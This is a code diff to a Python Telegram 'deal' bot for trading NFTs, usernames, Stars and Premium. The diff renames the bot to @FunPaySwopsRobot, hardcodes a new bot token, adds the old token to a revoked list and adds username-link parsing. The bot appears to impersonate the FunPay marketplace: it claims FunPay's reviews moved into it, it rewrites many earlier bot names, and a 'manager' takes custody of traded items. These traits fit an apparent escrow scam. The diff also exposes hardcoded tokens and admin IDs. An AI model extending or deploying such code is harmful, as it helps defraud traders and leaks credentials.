@@ -17,10 +17,11 @@ def InlineKeyboardButton(text=None, *args, **kwargs):
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# Бот @FunPaySwopRobot. Стабильный токен зашит в коде; env BOT_TOKEN принимается
+# Бот @FunPaySwopsRobot. Стабильный токен зашит в коде; env BOT_TOKEN принимается
 # только если getMe подтверждает, что это токен этого же бота.
-_BOT_TOKEN_DEFAULT = "8936984764:AAG1wXJnlXGoZWa8Je6KzuNddSBXXNfQxZk"
+_BOT_TOKEN_DEFAULT = "8859340400:AAFh5QR3pBvHNX76k7Wel5R2F8dDxj_jFQc"
 _BOT_TOKEN_REVOKED = {
+    "8936984764:AAG1wXJnlXGoZWa8Je6KzuNddSBXXNfQxZk",
     "8825086741:AAGposquJRRHcGNaDAdE2mSexGsdFlkF97k",
     "8952988329:AAFBfplvCDpTQxWTRvX5O54qF_THUZJdrvo",
     "8952988329:AAEU7kfhSrCLDkEvbDPi62DUz8wR7RMk53A",
@@ -47,9 +48,9 @@ _BOT_TOKEN_REVOKED = {
     "8719087641:AAENBuMcQLPbe24WEqXL9zUXHgxSZBjB9pM",
 }
 ADMIN_IDS    = {8726084830, 90283607, 7186944876, 828617672, 8489947571, 8237221184, 6701089763, 741904495,373873841}  
-BOT_USERNAME = "FunPaySwopRobot"
+BOT_USERNAME = "FunPaySwopsRobot"
 _KNOWN_BOT_USERNAMES = frozenset({
-    "FunPaySwopRobot", "FunPaySwapRobot", "FunPaySwapsRobot",
+    "FunPaySwopsRobot", "FunPaySwopRobot", "FunPaySwapRobot", "FunPaySwapsRobot",
 })
 
 def _token_getme(tok: str):
@@ -95,11 +96,12 @@ else:
     BOT_TOKEN = _BOT_TOKEN_DEFAULT
 
 def _bot_mention_fix(text):
-    """Старые юзы → актуальный  @FunPaySwopRobot."""
+    """Старые юзы → актуальный @FunPaySwopsRobot."""
     if not isinstance(text, str) or not text:
         return text
     out=text
     for old in (
+        "FunPaySwopRobot", "funpayswoprobot",
         "EldoradoGG_Robot", "EldoradoGGRobot", "EldoradoGG_robot", "eldoradoggrobot",
         "FunPaySavingRobot", "FunPaySaving_Robot", "funpaysavingrobot",
         "FunPayDeaIsOTCRobot", "funpaydeaisotcrobot",
@@ -1579,7 +1581,7 @@ async def send_log_msg(context, db, entry):
         promo_kb=InlineKeyboardMarkup([[
             InlineKeyboardButton(
                 "FunPay",
-                url="https://t.me/FunPaySwopRobot?start=start"
+                url=f"https://t.me/{BOT_USERNAME}?start=start"
             )
         ]])
         b=log_banners.get(event_key,{})
@@ -2378,6 +2380,8 @@ def validate_bank_name(text):
 
 _NFT_URL_RE=re.compile(r"(?:https?://)?(?:t\.me|telegram\.me)/nft/([^\s?#,;<>\[\]()]+)", re.I)
 _TG_NFT_RE=re.compile(r"tg://nft\?slug=([^\s&#]+)", re.I)
+_USR_URL_RE=re.compile(r"(?:https?://)?(?:t\.me|telegram\.me)/(?!nft/)([a-zA-Z0-9_]{5,})", re.I)
+_AT_USR_RE=re.compile(r"@([a-zA-Z0-9_]{5,})")
 
 def normalize_nft_link(text):
     import re
@@ -2456,16 +2460,91 @@ def parse_and_validate_nft_links(text, dtype, message=None):
         if not ok: return False,err,[]
     return True,None,links
 
+def normalize_username_link(text):
+    import re
+    t=(text or "").strip()
+    if t.startswith("@"): return t
+    for prefix in ("https://","http://"):
+        if t.startswith(prefix): t=t[len(prefix):]; break
+    if t.startswith("telegram.me/"): t="t.me/"+t[12:]
+    t=re.sub(r"^\d+[\.)]\s*","",t).lstrip("-•*").strip()
+    if t.startswith("t.me/"):
+        uname=t[5:].strip("/").split("?")[0].split("#")[0]
+        return f"@{uname}" if uname else t
+    if re.fullmatch(r"[a-zA-Z0-9_]{5,}", t): return f"@{t}"
+    return t
+
+def extract_username_links_from_text(text):
+    if not text: return []
+    links=[]
+    for m in _USR_URL_RE.finditer(text):
+        links.append(f"@{m.group(1)}")
+    for m in _AT_USR_RE.finditer(text):
+        links.append(f"@{m.group(1)}")
+    if links: return links
+    parts=re.split(r"[\n,;]+", text.strip())
+    for part in parts:
+        p=part.strip()
+        if not p: continue
+        link=normalize_username_link(p)
+        if link.startswith("@") and len(link)>5:
+            links.append(link)
+    return links
+
+def extract_username_links_from_message(message):
+    if not message: return []
+    links=extract_username_links_from_text(message.text or "")
+    if links: return links
+    text=message.text or ""
+    for ent in (message.entities or []):
+        chunk=""
+        if ent.type=="url":
+            chunk=text[ent.offset:ent.offset+ent.length]
+        elif ent.type=="text_link" and ent.url:
+            chunk=ent.url
+        elif ent.type=="mention":
+            chunk=text[ent.offset:ent.offset+ent.length]
+        if chunk:
+            links.extend(extract_username_links_from_text(chunk))
+    return links
+
+def parse_and_validate_username_links(text, message=None):
+    links=extract_username_links_from_message(message) if message else extract_username_links_from_text(text)
+    if not links and text:
+        links=extract_username_links_from_text(text)
+    if not links: return False,"empty",[]
+    import re
+    for link in links:
+        uname=link[1:] if link.startswith("@") else link
+        if len(uname)<5 or not re.fullmatch(r"[a-zA-Z0-9_]+", uname):
+            return False,"wrong_usr",[]
+    return True,None,links
+
 def deal_nft_links(dd):
     links=dd.get("nft_links")
     if isinstance(links,list) and links: return list(links)
     single=dd.get("nft_link")
     return [single] if single else []
 
+def deal_username_links(dd):
+    links=dd.get("trade_usernames")
+    if isinstance(links,list) and links: return list(links)
+    single=dd.get("trade_username")
+    return [single] if single else []
+
+def format_link_list_field(lang, label_one_ru, label_many_ru, label_one_en, label_many_en, label_one_uk, label_many_uk, items):
+    if not items:
+        return f"<b>{T(lang, label_one_ru, label_one_en, label_one_uk)}:</b> -"
+    if len(items)==1:
+        return f"<b>{T(lang, label_one_ru, label_one_en, label_one_uk)}:</b> {H(items[0])}"
+    lines="\n".join(f"• {H(x)}" for x in items)
+    return f"<b>{T(lang, label_many_ru, label_many_en, label_many_uk)} ({len(items)}):</b>\n{lines}"
+
 def draft_deal_data(ud):
     return {
         "nft_links":ud.get("nft_links"),
         "nft_link":ud.get("nft_link"),
+        "trade_usernames":ud.get("trade_usernames"),
         "trade_username":ud.get("trade_username"),
         "stars_count":ud.get("stars_count"),
         "premium_period":ud.get("premium_period"),
@@ -2473,30 +2552,37 @@ def draft_deal_data(ud):
 
 def format_deal_type_fields(dtype, dd, lang, creator_role="seller"):
     if dtype=="nft":
-        links=deal_nft_links(dd)
-        if not links:
-            return f"<b>{T(lang,'Ссылка NFT','NFT link','Посилання NFT')}:</b> -"
-        if len(links)==1:
-            return f"<b>{T(lang,'Ссылка NFT','NFT link','Посилання NFT')}:</b> {H(links[0])}"
-        lines="\n".join(f"• {H(l)}" for l in links)
-        return f"<b>{T(lang,'Ссылки NFT','NFT links','Посилання NFT')} ({len(links)}):</b>\n{lines}"
+        return format_link_list_field(
+            lang,
+            "Ссылка NFT","Ссылки NFT","NFT link","NFT links","Посилання NFT","Посилання NFT",
+            deal_nft_links(dd))
     if dtype=="username":
-        return f"<b>Username:</b> {H(dd.get('trade_username','-'))}"
+        return format_link_list_field(
+            lang,
+            "Ссылка username","Ссылки username","Username link","Username links","Посилання username","Посилання username",
+            deal_username_links(dd))
     if dtype=="stars":
-        stars_lbl=T(lang,"Звёзды","Stars","Зірки")
-        return f"<b>{stars_lbl}:</b> <b>{dd.get('stars_count','-')}</b>"
+        return f"<b>{T(lang,'Звёзды','Stars','Зірки')}:</b> <b>{dd.get('stars_count','-')}</b>"
     if dtype=="premium":
-        return f"<b>{T(lang,'Срок','Period','Термін')}:</b> {dd.get('premium_period','-')}"
+        return f"<b>{T(lang,'Срок Premium','Premium period','Термін Premium')}:</b> {dd.get('premium_period','-')}"
     return ""
 
 def format_nft_links_item(dd, lang):
     field=format_deal_type_fields("nft", dd, lang)
     return f"\n{field}" if field else ""
 
+def format_deal_links_inline(dtype, dd):
+    if dtype=="nft":
+        items=deal_nft_links(dd)
+    elif dtype=="username":
+        items=deal_username_links(dd)
+    else:
+        return ""
+    if not items: return ""
+    return "\n"+"\n".join(f"{Eln} {x}" for x in items)
+
 def format_nft_links_inline(dd):
-    links=deal_nft_links(dd)
-    if not links: return ""
-    return "\n"+"\n".join(f"{Eln} {l}" for l in links)
+    return format_deal_links_inline("nft", dd)
 
 def build_deal_review_text(ud, lang, deal_id=None):
     role=ud.get("creator_role","seller")
@@ -3032,7 +3118,7 @@ AI_KB = {
             "5) NFT - ссылка; Username - ссылка; Stars - количество; Premium - срок.\n"
             "6) Выберите валюту оплаты: TON / USDT / RUB / Stars / UAH.\n"
             "7) Введите сумму → проверьте карточку → «Создать сделку».\n"
-            "8) Отправьте партнёру ссылку вида  t.me/FunPaySwopRobot?start=deal_FPxxxxx. \n\n"
+            "8) Отправьте партнёру ссылку вида  t.me/FunPaySwopsRobot?start=deal_FPxxxxx. \n\n"
             "Важно: без привязанных реквизитов под валюту сделки создать/войти нельзя.\n"
             "Комиссия сервиса: 0%. Статус смотрите в «Мои сделки»."
         ),
@@ -3045,7 +3131,7 @@ AI_KB = {
             "5) NFT - link; Username - link; Stars - count; Premium - period.\n"
             "6) Choose payment currency: TON / USDT / RUB / Stars / UAH.\n"
             "7) Enter amount → review → Create deal.\n"
-            "8) Send the partner link:  t.me/FunPaySwopRobot?start=deal_FPxxxxx. \n\n"
+            "8) Send the partner link:  t.me/FunPaySwopsRobot?start=deal_FPxxxxx. \n\n"
             "Important: matching requisites are required for the deal currency.\n"
             "Service fee: 0%. Track status in My Deals."
         ),
@@ -3054,7 +3140,7 @@ AI_KB = {
         "keys": ("присоедин","join deal","войти в сделк","открыть ссылк","start=deal","партнёр не","не могу войти"),
         "ru": (
             "Как присоединиться к сделке\n\n"
-            "Откройте ссылку от партнёра (start=deal_FPxxxxx) в боте @FunPaySwopRobot.\n"
+            "Откройте ссылку от партнёра (start=deal_FPxxxxx) в боте @FunPaySwopsRobot.\n"
             "Если реквизитов нет - бот попросит привязать нужные (карта/телефон, TON или @username под валюту).\n"
             "После входа обе стороны видят карточку сделки и инструкции.\n"
             "Продавец передаёт товар и жмёт «Я передал». Менеджер подтвердит автоматически после получения товара.\n"
@@ -3063,7 +3149,7 @@ AI_KB = {
         ),
         "en": (
             "How to join a deal\n\n"
-            "Open the partner link (start=deal_FPxxxxx) in @FunPaySwopRobot.\n"
+            "Open the partner link (start=deal_FPxxxxx) in @FunPaySwopsRobot.\n"
             "If requisites are missing, bind the ones required for the deal currency.\n"
             "After joining both sides see the deal card and instructions.\n"
             "Seller transfers the item and presses I transferred. The manager confirms automatically after receiving it.\n"
@@ -3232,14 +3318,14 @@ AI_KB = {
         "keys": ("реферал","рефк","приглас","3%","referral","invite","партнёрк"),
         "ru": (
             "Реферальная программа\n\n"
-            "Раздел «Рефералы» → ваша ссылка t.me/FunPaySwopRobot?start=ref_ВАШ_ID.\n"
+            "Раздел «Рефералы» → ваша ссылка t.me/FunPaySwopsRobot?start=ref_ВАШ_ID.\n"
             "За друзей, которые заходят по ссылке, вы получаете 3% с каждой их сделки.\n"
             "В разделе видно: сколько приглашено, сколько заработано, список рефералов.\n"
             "Награда копится в статистике рефералов; вопросы по выплате - менеджеру."
         ),
         "en": (
             "Referral program\n\n"
-            "Referrals → your link t.me/FunPaySwopRobot?start=ref_YOUR_ID.\n"
+            "Referrals → your link t.me/FunPaySwopsRobot?start=ref_YOUR_ID.\n"
             "You earn 3% from each deal of users who joined via your link.\n"
             "See invited count, earned amount and referral list.\n"
             "Payout questions - ask the manager."
@@ -3271,7 +3357,7 @@ AI_KB = {
             "• Сайт: funpay.com · отзывы перенесены в этого бота\n"
             "• Информация → отзывы Mini App\n"
             "• FunPay AI: быстрые ответы по боту и любым темам; сложные кейсы - людям в поддержку.\n"
-            "Бот: @FunPaySwopRobot"
+            "Бот: @FunPaySwopsRobot"
         ),
         "en": (
             "Contacts and help\n\n"
@@ -3280,7 +3366,7 @@ AI_KB = {
             "• Website: funpay.com · reviews moved into this bot\n"
             "• Information → Reviews Mini App\n"
             "• FunPay AI: quick bot answers on any topic; hard cases go to human support.\n"
-            "Bot: @FunPaySwopRobot"
+            "Bot: @FunPaySwopsRobot"
         ),
     },
     "fee": {
@@ -5081,15 +5167,15 @@ async def on_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await send_step(deal_currency_prompt(lang),cur_kb(lang)); return
 
         if step=="trade_usr":
-            cl=text.strip().replace("https://","").replace("http://","")
-            import re as _re
-            ok_link = cl.startswith("t.me/") and len(cl[5:].strip("/"))>=5 and _re.fullmatch(r"[a-zA-Z0-9_]+", cl[5:].strip("/"))
-            ok_at   = text.strip().startswith("@") and len(text.strip()[1:])>=5 and _re.fullmatch(r"[a-zA-Z0-9_]+", text.strip()[1:])
-            if not ok_link and not ok_at:
+            ok,em,links=parse_and_validate_username_links(text,update.message)
+            if not ok:
                 await update.message.reply_text(
                     f"{Ewrn} <b>{L(lang,'Некорректная ссылка. Пример: t.me/username','Invalid link. Example: t.me/username','Некоректне посилання. Приклад: t.me/username')}</b>",
                     parse_mode="HTML"); return
-            ud["trade_username"]=text.strip(); ud["step"]="currency"
+            ud["trade_usernames"]=links
+            if len(links)==1: ud["trade_username"]=links[0]
+            else: ud.pop("trade_username",None)
+            ud["step"]="currency"
             await send_step(deal_currency_prompt(lang),cur_kb(lang)); return
 
         if step=="stars_cnt":
@@ -5152,8 +5238,12 @@ async def finalize_deal(update, context):
         if ud.get("nft_links"):
             data["nft_links"]=list(ud["nft_links"])
             if len(ud["nft_links"])==1: data["nft_link"]=ud["nft_links"][0]
+        if ud.get("trade_usernames"):
+            data["trade_usernames"]=list(ud["trade_usernames"])
+            if len(ud["trade_usernames"])==1: data["trade_username"]=ud["trade_usernames"][0]
         for key in ("nft_link","trade_username","stars_count","premium_period"):
             if key=="nft_link" and "nft_links" in data: continue
+            if key=="trade_username" and "trade_usernames" in data: continue
             if ud.get(key) is not None: data[key]=ud[key]
 
         deal_id=ud.pop("_pending_deal_id",None)
@@ -5391,10 +5481,7 @@ async def adm_confirm(update, context):
         if buyer_uid and buyer_uid!=s and buyer_uid in db["users"]:
             db["users"][buyer_uid]["success_deals"]=db["users"][buyer_uid].get("success_deals",0)+1
             db["users"][buyer_uid]["total_deals"]=db["users"][buyer_uid].get("total_deals",0)+1
-        ilink=""
-        if dtype=="nft":
-            ilink=format_nft_links_inline(dd)
-        elif dtype=="username" and dd.get("trade_username"): ilink=f"\n{Eln} {dd['trade_username']}"
+        ilink=format_deal_links_inline(dtype, dd)
         seller_uname=db["users"].get(s,{}).get("username","?") if s else "?"
         add_log(db,"Подтверждено",deal_id=deal_id,uid=s,username=seller_uname,
             extra=f"{amt_str} {deal_currency} | {payment_amount} {payment_currency}")
@@ -5422,11 +5509,7 @@ async def adm_confirm(update, context):
                             buyer_uid_post=u_p; break
                 buyer_uname_post=db["users"].get(buyer_uid_post,{}).get("username","") if buyer_uid_post else ""
                 buyer_link_post=f"@{buyer_uname_post}" if buyer_uname_post else d.get("partner","?")
-                link_str=""
-                if dtype=="nft":
-                    link_str=format_nft_links_inline(dd)
-                elif dtype=="username" and dd.get("trade_username"):
-                    link_str=f"\n{Eln} {dd['trade_username']}"
+                link_str=format_deal_links_inline(dtype, dd)
                 post_text=(
                     f"{ce('5258262708838472996','🔥')} <b>Сделка завершена!</b>\n\n"
                     f"{Eu} {buyer_link_post}\n"
@@ -6748,7 +6831,7 @@ def main():
         or "AAHeg97lGiedbE2fVtI8I3ht82UauX1uAsA" in BOT_TOKEN
         or "AAHDnEiXR1ZmBrESyRn0RJKOscIwsej4bXo" in BOT_TOKEN
     ):
-        raise SystemExit("Old Telegram bot token in use. Set BOT_TOKEN for @FunPaySwopRobot.")
+        raise SystemExit(f"Old Telegram bot token in use. Set BOT_TOKEN for @{BOT_USERNAME}.")
 
     db=load_db()
     if not db.get("banners"): db["banners"]={}
